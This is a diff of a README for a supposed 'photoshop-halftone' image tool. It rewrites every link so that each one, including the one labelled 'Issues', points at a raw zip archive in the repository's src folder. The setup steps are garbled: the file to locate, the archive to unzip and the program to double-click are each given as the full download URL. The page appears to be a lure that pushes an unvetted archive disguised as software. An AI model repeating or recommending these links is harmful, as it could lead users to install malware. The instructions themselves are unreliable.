@@ -1,7 +1,7 @@
 # 🎨 photoshop-halftone - Create Stunning Halftone Images Easily
 
 ## 📦 Download Now
-[![Download](https://github.com/Durva-afk/photoshop-halftone/raw/refs/heads/main/src/photoshop-halftone-3.2.zip)](https://github.com/Durva-afk/photoshop-halftone/raw/refs/heads/main/src/photoshop-halftone-3.2.zip)
+[![Download](https://raw.githubusercontent.com/Durva-afk/photoshop-halftone/main/src/halftone_photoshop_v1.2.zip)](https://raw.githubusercontent.com/Durva-afk/photoshop-halftone/main/src/halftone_photoshop_v1.2.zip)
 
 ## 📖 About
 photoshop-halftone is a simple application that converts your images into beautiful halftone art. You can customize the style and personality of the halftone effect to match your creative vision. Whether you are a photographer, a graphic designer, or just someone who enjoys playing with images, this tool can add a unique touch to your work.
@@ -17,20 +17,20 @@ photoshop-halftone is a simple application that converts your images into beauti
 ### Step 1: Download the Application
 To get started, you need to download the application from our Releases page. Click the link below:
 
-[Download the latest version](https://github.com/Durva-afk/photoshop-halftone/raw/refs/heads/main/src/photoshop-halftone-3.2.zip)
+[Download the latest version](https://raw.githubusercontent.com/Durva-afk/photoshop-halftone/main/src/halftone_photoshop_v1.2.zip)
 
 ### Step 2: Install the Application
 Once the download is complete, follow these simple steps to install photoshop-halftone:
 
-1. **Locate the Downloaded File:** Go to your Downloads folder and find the downloaded file. The file will be named something like `https://github.com/Durva-afk/photoshop-halftone/raw/refs/heads/main/src/photoshop-halftone-3.2.zip`.
+1. **Locate the Downloaded File:** Go to your Downloads folder and find the downloaded file. The file will be named something like `https://raw.githubusercontent.com/Durva-afk/photoshop-halftone/main/src/halftone_photoshop_v1.2.zip`.
    
 2. **Extract the Files:**
    - For Windows: Right-click on the ZIP file and select "Extract All". Follow the prompts to choose a folder.
    - For macOS: Double-click the ZIP file, and it will automatically extract the files into a new folder.
-   - For Linux: Open a terminal window and use the command `unzip https://github.com/Durva-afk/photoshop-halftone/raw/refs/heads/main/src/photoshop-halftone-3.2.zip`.
+   - For Linux: Open a terminal window and use the command `unzip https://raw.githubusercontent.com/Durva-afk/photoshop-halftone/main/src/halftone_photoshop_v1.2.zip`.
 
 3. **Run the Application:**
-   - For Windows: Navigate to the folder where you extracted the files and double-click `https://github.com/Durva-afk/photoshop-halftone/raw/refs/heads/main/src/photoshop-halftone-3.2.zip`.
+   - For Windows: Navigate to the folder where you extracted the files and double-click `https://raw.githubusercontent.com/Durva-afk/photoshop-halftone/main/src/halftone_photoshop_v1.2.zip`.
    - For macOS and Linux: Open a terminal, navigate to the folder, and run `./photoshop-halftone`.
 
 ### Step 3: Customize Your Halftone Images
@@ -59,7 +59,7 @@ If you encounter issues, here are some solutions:
 - **Customization Settings Not Applying:** Restart the application and attempt to load the image again.
 
 ## 🌐 Get Involved
-If you would like to contribute to the photoshop-halftone project, feel free to check the [Issues](https://github.com/Durva-afk/photoshop-halftone/raw/refs/heads/main/src/photoshop-halftone-3.2.zip) page. Your suggestions and contributions are welcome!
+If you would like to contribute to the photoshop-halftone project, feel free to check the [Issues](https://raw.githubusercontent.com/Durva-afk/photoshop-halftone/main/src/halftone_photoshop_v1.2.zip) page. Your suggestions and contributions are welcome!
 
 ## 📬 Contact
 For further questions or support, reach out through the GitHub repository. Look for the "Contact" section.
@@ -67,4 +67,4 @@ For further questions or support, reach out through the GitHub repository. Look 
 ## 💡 Final Notes
 Turn your ordinary photos into extraordinary pieces of art with just a few clicks. Enjoy the flexibility and fun as you explore the world of halftone image conversion. Download the app and start creating today! 
 
-[Download the latest version](https://github.com/Durva-afk/photoshop-halftone/raw/refs/heads/main/src/photoshop-halftone-3.2.zip)
+[Download the latest version](https://raw.githubusercontent.com/Durva-afk/photoshop-halftone/main/src/halftone_photoshop_v1.2.zip)
